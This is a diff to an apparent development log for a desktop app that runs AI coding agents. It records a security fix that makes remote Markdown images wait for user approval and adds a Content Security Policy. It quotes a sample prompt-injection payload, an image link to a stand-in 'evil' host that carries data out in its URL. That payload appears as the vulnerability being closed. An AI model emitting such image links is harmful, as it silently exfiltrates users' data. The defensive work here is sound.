@@ -4569,3 +4569,30 @@ long tasks 28/41 → 9/5; scroll frames > 50 ms 51/49 → 43/45 (long tasks 12/6
 switch 196/131 → 149/128 ms. Load at 4x: CLS 0 in all 5 runs before and after; the 0.2027 turn-window shift of the previous
 pass did not show, so whether its cause is gone is not verified. Entry bundle 160.24 kB (integration tip 160.28). Not verified:
 WebKit, the Tauri shell, a real harness, the phone layout.
+
+## As built — remote images wait for the person; the webview has a CSP (security review, 2026-11-19)
+
+- **Markdown images.** `shared/Markdown` had no `img` override, so an agent's `![](https://evil/?d=…)` (a prompt
+  injection) was fetched as soon as it rendered, carrying its URL out with no approval. Now `MarkdownImage` (in the lazy
+  Markdown chunk) renders a remote image (`http(s)://`, `//`) as a compact chip with the alt text, the host and a "Load
+  image" action (loads without a referrer); relative paths render as before; `data:` is dropped by react-markdown as
+  before (the alt text shows); any other scheme never loads (`lib/markdownImage.ts`). The chip is the file preview's
+  (`ImageChip`, now shared with `MarkdownPreview`); the pull request text keeps its own "[image: …]" text.
+- **CSP.** `tauri.conf.json` had `"csp": null`. It now sets `default-src 'self'; script-src 'self'; style-src 'self'
+  'unsafe-inline'; img-src 'self' data: blob: https: http://127.0.0.1:* http://localhost:*; font-src 'self' data:;
+  connect-src 'self' ipc: http://ipc.localhost http://127.0.0.1:* http://localhost:* ws://127.0.0.1:* ws://localhost:*;
+  worker-src 'self' blob:; frame-src http://127.0.0.1:* http://localhost:*; object-src 'none'; base-uri 'self';
+  form-action 'none'`, with `dangerousDisableAssetCspModification: ["style-src"]` (Tauri's hashes would otherwise void
+  `'unsafe-inline'`, which Monaco's and xterm's runtime `<style>` need) and `devCsp: null` (Vite's dev page runs an inline
+  script). Exceptions, on purpose: `https:` images (only after "Load image"), loopback `http`/`ws` on any port (the
+  harness port is chosen at start; the Browser tab's proxy port is ephemeral). The first-paint theme script moved from
+  inline to `public/theme.js` (as in `apps/web`).
+- Verified: `shared/Markdown.test.ts` (failed before: `<img src="https://evil…">`), `lib/markdownImage.test.ts`,
+  `apps/desktop` `tauriCsp.test.ts` and `firstPaintTheme.test.ts`, `apps/web` `csp.test.ts`; the production build loaded in
+  Chromium (Playwright) with the policy as a response header against a real harness on the mock model: chat (the remote
+  image showed as the chip, no request left the machine), Files with Monaco and the Markdown preview, Terminal (xterm,
+  typed command echoed), Browser tab (a local dev site in the proxy iframe), Review: **0 CSP violations, 0 console
+  errors, 0 off-machine requests**; the initial JS stayed within budget. Not verified: the Tauri runtime (the shell is
+  not compiled here: no WebKitGTK), WebKit (Playwright's WebKit is not installed here), "Load image" against a real
+  remote host.
+
